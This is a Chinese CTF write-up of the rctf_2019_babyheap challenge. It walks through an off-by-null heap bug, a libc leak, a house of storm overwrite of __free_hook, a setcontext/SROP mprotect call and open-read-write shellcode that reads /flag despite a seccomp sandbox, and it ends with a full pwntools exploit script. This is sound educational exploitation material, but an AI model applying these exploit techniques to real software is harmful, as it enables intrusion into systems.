**同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，
若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。**
# 例题
## rctf_2019_babyheap
![在这里插入图片描述](https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png)

![在这里插入图片描述]("https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png")
保护全开，禁用了execve就是禁用了system，因为system函数通过调用execve函数才能执行。
看一下ida
### main函数
可以看到是实现了四个功能，增改删查

	int __cdecl main(int argc, const char **argv, const char **envp)
	{
	  init(argc, argv, envp);
	  while ( 1 )
	  {
	    menu();
	    switch ( get_int() )
	    {
	      case 1:
	        add();
	        break;
	      case 2:
	        edit();
	        break;
	      case 3:
	        delete();
	        break;
	      case 4:
	        show();
	        break;
	      case 5:
	        puts("See you next time!");
	        exit(0);
	      default:
	        puts("Invalid choice!");
	        break;
	    }
	  }
	}

### add函数
可以申请最大0x1000大小的chunk，最多申请16个chunk


	unsigned __int64 add()
	{
	  void **v0; // rbx
	  int i; // [rsp+0h] [rbp-20h]
	  int size; // [rsp+4h] [rbp-1Ch]
	  unsigned __int64 v4; // [rsp+8h] [rbp-18h]
	
	  v4 = __readfsqword(0x28u);
	  for ( i = 0; *(ptrs + 2 * i) && i <= 15; ++i )
	    ;
	  if ( i == 16 )
	  {
	    puts("You can't");
	    exit(-1);
	  }
	  printf("Size: ");
	  size = get_int();
	  if ( size <= 0 || size > 0x1000 )
	  {
	    puts("Invalid size :(");
	  }
	  else
	  {
	    *(ptrs + 4 * i + 2) = size;
	    v0 = (ptrs + 16 * i);
	    *v0 = calloc(size, 1uLL);
	    puts("Add success :)");
	  }
	  return __readfsqword(0x28u) ^ v4;
	}
### edit函数
存在off-by-null漏洞


	unsigned __int64 edit()
	{
	  unsigned int v1; // [rsp+0h] [rbp-10h]
	  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
	
	  v2 = __readfsqword(0x28u);
	  printf("Index: ");
	  v1 = get_int();
	  if ( v1 <= 0xF && *(ptrs + 2 * v1) )
	  {
	    printf("Content: ");
	    *(*(ptrs + 2 * v1) + read_n(*(ptrs + 2 * v1), *(ptrs + 4 * v1 + 2))) = 0; //off-by-one
	    puts("Edit success :)");
	  }
	  else
	  {
	    puts("Invalid index :(");
	  }
	  return __readfsqword(0x28u) ^ v2;
	}
### delete函数
	unsigned __int64 delete()
	{
	  unsigned int v1; // [rsp+4h] [rbp-Ch]
	  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
	
	  v2 = __readfsqword(0x28u);
	  printf("Index: ");
	  v1 = get_int();
	  if ( v1 <= 0xF && *(ptrs + 2 * v1) )
	  {
	    free(*(ptrs + 2 * v1));
	    *(ptrs + 2 * v1) = 0LL;
	    *(ptrs + 4 * v1 + 2) = 0;
	    puts("Delete success :)");
	  }
	  else
	  {
	    puts("Invalid index :(");
	  }
	  return __readfsqword(0x28u) ^ v2;
	}
### show函数

	unsigned __int64 show()
	{
	  unsigned int v1; // [rsp+4h] [rbp-Ch]
	  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
	
	  v2 = __readfsqword(0x28u);
	  printf("Index: ");
	  v1 = get_int();
	  if ( v1 <= 0xF && *(ptrs + 2 * v1) )
	    puts(*(ptrs + 2 * v1));
	  else
	    puts("Invalid index :(");
	  return __readfsqword(0x28u) ^ v2;
	}

### 思路
看了大佬的博客[rctf_2019_babyheap](https://blog.csdn.net/weixin_44145820/article/details/105709145)，这里对其进行详细的解析。
![在这里插入图片描述](https://img-blog.csdnimg.cn/c2a49de2eb0a492d882fd2f865cb3fd9.png)
程序禁用了fastbin，且能申请最大为0x1000大小的chuck，可以使用house of storm，修改free_hook的地址为shellcode，执行shellcode，这里我们需要用orw来写shellcode，并且在这之前需要用mprotect函数修改free_hook段为可读可写可执行权限。

## 调试过程
先把前面的写好

	# coding=utf-8
	from pwn import *
	#sh = remote("node4.buuoj.cn", 29278)
	sh = process('./rctf_2019_babyheap')
	context(log_level = 'debug', arch = 'amd64', os = 'linux')
	elf = ELF("./rctf_2019_babyheap")
	libc = ELF('../../libc-2.23.so--64')
	def dbg():
	        gdb.attach(sh)
	        pause()
	
	#命令简写化
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims   :sh.recvuntil(delims)
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg=lambda address,data:log.success('%s: '%(address)+hex(data))
	
	 
	def add(size):
		ru("Choice: \n")
		sl('1')
		ru("Size: ")
		sl(str(size))
	
	def free(index):
		ru("Choice: \n")
		sl('3')
		ru("Index: ")
		sl(str(index))
	
	def show(index):
		ru("Choice: \n")
		sl('4')
		ru("Index: ")
		sl(str(index))
	
	def edit(index, content):
		ru("Choice: \n")
		sl('2')
		ru("Index: ")
		sl(str(index))
		ru("Content: ")
		s(content)

### 首先构造堆块重叠，泄露libc基地址
先申请四个chunk，申请的chunk真正大小分别为0x90,0x70,0x100,0x20,
chunk_3是为了free前三个chunk后防止堆块合并
 
	add(0x80)#0
	add(0x68)#1
	add(0xf0)#2
	add(0x18)#3
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/b273495bb0594e12a61988abd446ee94.png)
之后free chunk_0，此时因为禁用了fastbin，所以chunk_0直接进入了unsortedbin里，再利用off-by-null漏洞修改chunk_2的pre_size为0x100（chunk_0+chunk_1正好就是0x100），修改chunk_2的size为0x100，使他处于free状态。

	free(0)
	payload = 'a'*0x60 + p64(0x100)
	edit(1, payload)
	
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/b4ecbc1851fb4a11b72f4961b3cb4df3.png)
free chunk_2后，触发堆块前向合并，chunk_2的pre_size为是0x100,chunk_0和chunk_1加起来是0x100，就是前三个chunk合并。unsortedbin里存放着原chunk_0的起始地址。

	free(2)

	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/62792e0e3da5422d95259220edb7fdb8.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/dd94627bad054eb4b8269b4b8e123b05.png)
此时chunk_1是没有被free的，然后我们再次申请0x80（原chunk_0大小）大小的chunk，此时原chunk_1的mem区域存放着main_arena+88，因为chunk_1并没有被free，所以我们直接调用show函数即可泄露libc基地址。

	add(0x80)#0
	show(1)
	malloc_hook = u64(ru('\x7f').ljust(8, '\x00')) - 0x58 - 0x10
	libc.address = malloc_hook - libc.sym['__malloc_hook']
	system = libc.sym['system']
	free_hook = libc.sym['__free_hook']
	set_context = libc.symbols['setcontext']
	lg('libc_base',libc.address)
	
	dbg()

![在这里插入图片描述](https://img-blog.csdnimg.cn/9ff831c9123540d58be264d17010621a.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/9869752c89264053a4f41e7c96e5278d.png)

### 构造unsortbin chunk 和largebin chunk，进行 house of strom
先申请0x160大小的chunk，将unsortbin中残余chunk清空，之后构造unsortbin chunk 和largebin chunk的调试过程请参考我另一篇文章[House of storm](https://blog.csdn.net/tbsqigongzi/article/details/126185571?spm=1001.2014.3001.5502)
此时我们已以可以修改free_hook处的值了

	#---------------布置chunk-------------------------#
	add(0x18)#4
	add(0x508)#5
	add(0x18)#6
	add(0x18)#7
	add(0x508)#8
	add(0x18)#9
	add(0x18)#10

	#dbg()
	#----------------准备 unsorted chunk-----------------------#	
	edit(5, 'a'*0x4f0+p64(0x500))

	#dbg()

	free(5)
	edit(4, 'a'*0x18)
	
	#dbg()

	add(0x18)#5
	add(0x4d8)#11
	free(5)
	free(6)
	
	#dbg()
	
	add(0x30)#5
	add(0x4e8)#6
	
	#dbg()
	
	#-------------------准备 large chunk-----------------------------------#
	edit(8, 'a'*0x4f0+p64(0x500))
	free(8)
	edit(7, 'a'*0x18)
	add(0x18)#8
	add(0x4d8)#12
	free(8)
	free(9)
	add(0x40)#8
	#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#
	
	#dbg()
	
	free(6)
	
	#dbg()
	
	add(0x4e8)#6
	
	#dbg()
	
	free(6)

	#dbg()

	#pause()
	#--------------修改他们的满足条件进行 house of strom------------------------------#
	storage = free_hook
	fake_chunk = storage - 0x20
	payload = '\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
	edit(11, payload)

	#dbg()

	payload = '\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)
	edit(12, payload)

	#dbg()

	add(0x48)#6

### mprotect+shellcode
修改free_hook为set_context+53，free_hook+0x18，free_hook+0x18，shellcode1,
setcontext函数负责对各个寄存器进行赋值，甚至可以控制rip，对寄存器进行赋值主要从+53开始，shellcode1即为read(0, new_addr,0x1000)，new_addr即为（free_hook &0xFFFFFFFFFFFFF000）free_hook所在内存页的起始位置。我们将对这里赋予可读可写可执行权限。

	new_addr =  free_hook &0xFFFFFFFFFFFFF000
	shellcode1 = '''
	xor rdi,rdi
	mov rsi,%d
	mov edx,0x1000

	mov eax,0
	syscall

	jmp rsi
	''' % new_addr
	edit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))

 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/61bf594dbee4483f94beaf7afa376c9d.png)



修改前
![在这里插入图片描述](https://img-blog.csdnimg.cn/59681f7ab0f64f57a185cacaffcb4ca2.png)
修改后
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/6bbe06a1c4ab4168a5bcf210118afc78.png)

### SROP
我们利用pwntools里的SigreturnFrame()执行mprotect(new_addr,0x1000,7)，并将rsp跳转到
 free_hook+0x10处，即0x00007f05935487c0，之后执行0x00007f05935487c0地址处的代码，即我们刚才写入的shellcode1，执行read(0, new_addr,0x1000)，将我们构造的第二个shellcode写入0x00007f0593548000处 ，并将rip跳转到我们写的第二个shellcode处执行。
 
	frame = SigreturnFrame()
	frame.rsp = free_hook+0x10
	frame.rdi = new_addr
	frame.rsi = 0x1000
	frame.rdx = 7
	frame.rip = libc.sym['mprotect']
	edit(12, str(frame))
	free(12)
![在这里插入图片描述](https://img-blog.csdnimg.cn/0211f5b1b2cb415b910461947216e62e.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/96861fc257104349a4a906803ad96103.png)


### ORW
利用orw构造shellcode，发送过去并执行，获得shell

	shellcode2 = '''
	mov rax, 0x67616c662f ;// /flag
	push rax

	mov rdi, rsp ;// /flag
	mov rsi, 0 ;// O_RDONLY
	xor rdx, rdx ;
	mov rax, 2 ;// SYS_open
	syscall

	mov rdi, rax ;// fd 
	mov rsi,rsp  ;
	mov rdx, 1024 ;// nbytes
	mov rax,0 ;// SYS_read
	syscall

	mov rdi, 1 ;// fd 
	mov rsi, rsp ;// buf
	mov rdx, rax ;// count 
	mov rax, 1 ;// SYS_write
	syscall

	mov rdi, 0 ;// error_code
	mov rax, 60
	syscall
	'''
	sl(asm(shellcode2))
	itr()

 
	
![在这里插入图片描述](https://img-blog.csdnimg.cn/7f499b7e484a41cf8d8efde596b692d9.png)
## exp

	# coding=utf-8
	from pwn import *
	#sh = remote("node4.buuoj.cn", 29278)
	sh = process('./rctf_2019_babyheap')
	context(log_level = 'debug', arch = 'amd64', os = 'linux')
	elf = ELF("./rctf_2019_babyheap")
	libc = ELF('../../libc-2.23.so--64')
	def dbg():
	        gdb.attach(sh)
	        pause()
	
	#命令简写化
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims   :sh.recvuntil(delims)
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg=lambda address,data:log.success('%s: '%(address)+hex(data))
	
	 
	def add(size):
		ru("Choice: \n")
		sl('1')
		ru("Size: ")
		sl(str(size))
	
	def free(index):
		ru("Choice: \n")
		sl('3')
		ru("Index: ")
		sl(str(index))
	
	def show(index):
		ru("Choice: \n")
		sl('4')
		ru("Index: ")
		sl(str(index))
	
	def edit(index, content):
		ru("Choice: \n")
		sl('2')
		ru("Index: ")
		sl(str(index))
		ru("Content: ")
		s(content)
	
	def pwn():
	 
		add(0x80)#0
		add(0x68)#1
		add(0xf0)#2
		add(0x18)#3
		
		#dbg()
	
		free(0)
		payload = 'a'*0x60 + p64(0x100)
		edit(1, payload)
		
		#dbg()
		
		free(2)
	
		#dbg()
	
		add(0x80)#0
		show(1)
		malloc_hook = u64(ru('\x7f').ljust(8, '\x00')) - 0x58 - 0x10
		libc.address = malloc_hook - libc.sym['__malloc_hook']
		system = libc.sym['system']
		free_hook = libc.sym['__free_hook']
		set_context = libc.symbols['setcontext']
		lg('libc_base',libc.address)
		
		#dbg()
		
		add(0x160)#2
	
		#dbg()
		#---------------布置chunk-------------------------#
		add(0x18)#4
		add(0x508)#5
		add(0x18)#6
		add(0x18)#7
		add(0x508)#8
		add(0x18)#9
		add(0x18)#10
	
		#dbg()
		#----------------准备 unsorted chunk-----------------------#	
		edit(5, 'a'*0x4f0+p64(0x500))
	
		#dbg()
	
		free(5)
		edit(4, 'a'*0x18)
		
		#dbg()
	
		add(0x18)#5
		add(0x4d8)#11
		free(5)
		free(6)
		
		#dbg()
		
		add(0x30)#5
		add(0x4e8)#6
		
		#dbg()
		
		#-------------------准备 large chunk-----------------------------------#
		edit(8, 'a'*0x4f0+p64(0x500))
		free(8)
		edit(7, 'a'*0x18)
		add(0x18)#8
		add(0x4d8)#12
		free(8)
		free(9)
		add(0x40)#8
		#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#
		
		#dbg()
		
		free(6)
		
		#dbg()
		
		add(0x4e8)#6
		
		#dbg()
		
		free(6)
	
		#dbg()
	
		#pause()
		#--------------修改他们的满足条件进行 house of strom------------------------------#
		storage = free_hook
		fake_chunk = storage - 0x20
		payload = '\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
		edit(11, payload)
	
		#dbg()
	
		payload = '\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)
		edit(12, payload)
	
		#dbg()
	
		add(0x48)#6
		
		#dbg()
	
		new_addr =  free_hook &0xFFFFFFFFFFFFF000
		shellcode1 = '''
		xor rdi,rdi
		mov rsi,%d
		mov edx,0x1000
	
		mov eax,0
		syscall
	
		jmp rsi
		''' % new_addr
		edit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))
	
		#dbg()
	
		frame = SigreturnFrame()
		frame.rsp = free_hook+0x10
		frame.rdi = new_addr
		frame.rsi = 0x1000
		frame.rdx = 7
		frame.rip = libc.sym['mprotect']
		edit(12, str(frame))
		free(12)
		#dbg() 
	
		shellcode2 = '''
		mov rax, 0x67616c662f ;// /flag
		push rax
	
		mov rdi, rsp ;// /flag
		mov rsi, 0 ;// O_RDONLY
		xor rdx, rdx ;
		mov rax, 2 ;// SYS_open
		syscall
	
		mov rdi, rax ;// fd 
		mov rsi,rsp  ;
		mov rdx, 1024 ;// nbytes
		mov rax,0 ;// SYS_read
		syscall
	
		mov rdi, 1 ;// fd 
		mov rsi, rsp ;// buf
		mov rdx, rax ;// count 
		mov rax, 1 ;// SYS_write
		syscall
	
		mov rdi, 0 ;// error_code
		mov rax, 60
		syscall
		'''
		sl(asm(shellcode2))
		
	
		dbg()
		itr()
	 
	 
	pwn()

